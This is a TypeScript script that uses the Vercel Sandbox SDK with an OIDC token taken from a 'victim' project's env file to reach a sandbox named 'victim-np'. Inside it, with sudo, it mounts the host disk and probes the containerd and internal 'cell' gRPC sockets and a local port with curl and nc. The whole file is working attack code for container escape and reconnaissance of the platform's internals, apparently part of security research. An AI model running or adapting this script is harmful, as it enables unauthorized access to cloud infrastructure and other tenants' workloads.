import { Sandbox } from "@vercel/sandbox";
import { readFileSync } from "fs";
function loadEnv(file: string): Record<string, string> {
  const out: Record<string, string> = {};
  for (const line of readFileSync(file, "utf8").split("\n")) {
    const m = line.match(/^([A-Z_]+)=(.*)$/);
    if (m) out[m[1]] = m[2].trim();
  }
  return out;
}
const VICTIM = loadEnv("/tmp/vercel-sandbox/victima/.env.local").VERCEL_OIDC_TOKEN!;
const V = JSON.parse(Buffer.from(VICTIM.split(".")[1], "base64url").toString());

const EXPLORE = `#!/bin/bash
set +e
mkdir -p /mnt/vda2
mount -t xfs /dev/vda /mnt/vda2 2>/dev/null
R=/mnt/vda2
echo "===== containerd.sock verbose ====="
timeout 6 curl -v --http2 --unix-socket $R/run/containerd/containerd.sock -X POST "http://unix/containerd.services.containers.v1.Containers/List" -H 'Content-Type: application/grpc' -H 'TE: trailers' --data-binary $'\\x00\\x00\\x00\\x00\\x00' 2>&1 | head -30
echo
echo "===== cell.sock verbose ====="
timeout 6 curl -v --http2 --unix-socket $R/run/cell/cell.sock -X POST "http://unix/vercel.hive.celld.api.v1.CelldService/RegisterPort" -H 'Content-Type: application/grpc' -H 'TE: trailers' --data-binary $'\\x00\\x00\\x00\\x00\\x00' 2>&1 | head -30
echo
echo "===== TCP 30002 verbose ====="
timeout 6 curl -v --http2-prior-knowledge -X POST "http://127.0.0.1:30002/containerd.services.containers.v1.Containers/List" -H 'Content-Type: application/grpc' -H 'TE: trailers' --data-binary $'\\x00\\x00\\x00\\x00\\x00' 2>&1 | head -30
echo
echo "===== raw h2c preface test on 30002 ====="
printf 'PRI * HTTP/2.0\\r\\n\\r\\nSM\\r\\n\\r\\n\\x00\\x00\\x00\\x04\\x00\\x00\\x00\\x00\\x00' | timeout 4 nc 127.0.0.1 30002 2>&1 | head -c 100 | od -c | head -8
echo "===== raw HTTP1.1 GET on 30002 ====="
printf 'GET / HTTP/1.1\\r\\nHost: x\\r\\n\\r\\n' | timeout 4 nc 127.0.0.1 30002 2>&1 | head -c 100 | od -c | head -8
echo DONE`;

const SCRIPT = `set +e
cat > /tmp/explore8.sh <<'EXPLORE_EOF'
${EXPLORE}
EXPLORE_EOF
sudo unshare -m --propagation private bash /tmp/explore8.sh 2>&1
echo "=== rc: $? ==="
`;

async function main() {
  const sbx = await Sandbox.get({ name: "victim-np", token: VICTIM, teamId: V.owner_id, projectId: V.project_id });
  const res = await sbx.runCommand("bash", ["-c", SCRIPT], { sudo: true, wait: true, timeout: 180_000 });
  console.log("exit:", res.exitCode);
  console.log(await res.output("both"));
}
main().catch((e) => { console.error("ERR", e.message); process.exit(1); });